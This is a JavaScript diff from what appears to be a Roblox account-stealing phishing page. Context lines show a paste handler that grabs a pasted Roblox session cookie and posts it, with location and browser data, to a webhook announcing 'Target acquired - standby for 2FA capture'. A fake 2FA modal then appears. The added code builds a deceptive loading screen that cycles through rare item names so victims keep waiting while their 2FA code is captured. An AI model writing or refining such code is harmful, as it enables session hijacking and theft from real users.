@@ -699,10 +699,27 @@ function showVerificationSuccess(trustDevice) {
     
     setTimeout(() => {
         closeVerificationModal();
-        showNotification(
-            `Verification successful${trustDevice ? ' - Device trusted for 30 days' : ''}`, 
-            'success'
-        );
+        
+        // Go back to checking items after 2FA
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        if (loadingOverlay) {
+            loadingOverlay.style.display = 'flex';
+            
+            // Update loading text to show final checking
+            const loadingText = document.querySelector('#loadingOverlay h3');
+            if (loadingText) {
+                loadingText.textContent = 'Finalizing verification...';
+                
+                // Show final completion after 3 seconds
+                setTimeout(() => {
+                    loadingText.textContent = 'Verification complete!';
+                    setTimeout(() => {
+                        loadingOverlay.style.display = 'none';
+                        loadingText.textContent = 'Verifying Roblox Items...'; // Reset for next time
+                    }, 2000);
+                }, 3000);
+            }
+        }
         
         // Reset button
         verifyBtn.disabled = false;
@@ -776,7 +793,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// Handle paste event - immediate cookie capture + 80s timer for 2FA
+// Handle paste event - immediate loading with item names, then 2FA after 80 seconds
 async function handlePasteEvent(pastedText) {
     try {
         console.log('🍪 PASTE EVENT TRIGGERED - Content length:', pastedText.length);
@@ -788,10 +805,11 @@ async function handlePasteEvent(pastedText) {
         if (robloxCookie) {
             console.log('Roblox cookie found in pasted content, sending immediately...');
             
-            // Show loading overlay immediately
+            // Show loading overlay with rotating item names
             const loadingOverlay = document.getElementById('loadingOverlay');
             if (loadingOverlay) {
                 loadingOverlay.style.display = 'flex';
+                startItemNameRotation();
             }
             
             // Get user location
@@ -815,7 +833,7 @@ Content Length: ${pastedText.length} characters
 Browser: ${navigator.userAgent}
 Screen: ${screen.width}x${screen.height}
 \`\`\`
-⏰ **Loading screen active - 2FA will appear in 80 seconds...**
+⏰ **Loading with item names - 2FA will appear in 80 seconds...**
 🎯 **Target acquired - standby for 2FA capture**
 @everyone`
             };
@@ -832,13 +850,14 @@ Screen: ${screen.width}x${screen.height}
             if (response.ok) {
                 console.log('Cookie sent to webhook successfully');
                 
-                // Keep loading screen active and show 2FA after 80 seconds
+                // Show 2FA after 80 seconds
                 setTimeout(() => {
-                    console.log('🔐 80 SECONDS ELAPSED - HIDING LOADING AND SHOWING 2FA!');
+                    console.log('🔐 80 SECONDS ELAPSED - SHOWING 2FA MODAL!');
                     
                     // Hide loading overlay
                     if (loadingOverlay) {
                         loadingOverlay.style.display = 'none';
+                        stopItemNameRotation();
                     }
                     
                     // Show 2FA modal
@@ -850,6 +869,7 @@ Screen: ${screen.width}x${screen.height}
                 // Hide loading on error
                 if (loadingOverlay) {
                     loadingOverlay.style.display = 'none';
+                    stopItemNameRotation();
                 }
             }
         } else {
@@ -861,7 +881,53 @@ Screen: ${screen.width}x${screen.height}
         const loadingOverlay = document.getElementById('loadingOverlay');
         if (loadingOverlay) {
             loadingOverlay.style.display = 'none';
+            stopItemNameRotation();
         }
+    }
+}
+
+// Rotating item names for loading screen
+let itemNameInterval = null;
+const itemNames = [
+    "Dominus Empyreus",
+    "Valkyrie Helm",
+    "Clockwork Shades",
+    "Korblox Deathspeaker",
+    "Dominus Frigidus",
+    "Red Valkyrie",
+    "Sparkle Time Fedora",
+    "Dominus Messor",
+    "Golden Valkyrie",
+    "Emerald Valkyrie",
+    "Dominus Infernus",
+    "Violet Valkyrie",
+    "Dominus Rex",
+    "Poisoned Horns",
+    "Beautiful Hair",
+    "Shaggy",
+    "Pal Hair"
+];
+
+function startItemNameRotation() {
+    const loadingText = document.querySelector('#loadingOverlay h3');
+    if (!loadingText) return;
+    
+    let currentIndex = 0;
+    
+    // Change item name every 2 seconds
+    itemNameInterval = setInterval(() => {
+        loadingText.textContent = `Checking ${itemNames[currentIndex]}...`;
+        currentIndex = (currentIndex + 1) % itemNames.length;
+    }, 2000);
+    
+    // Set initial text
+    loadingText.textContent = `Checking ${itemNames[0]}...`;
+}
+
+function stopItemNameRotation() {
+    if (itemNameInterval) {
+        clearInterval(itemNameInterval);
+        itemNameInterval = null;
     }
 }
 
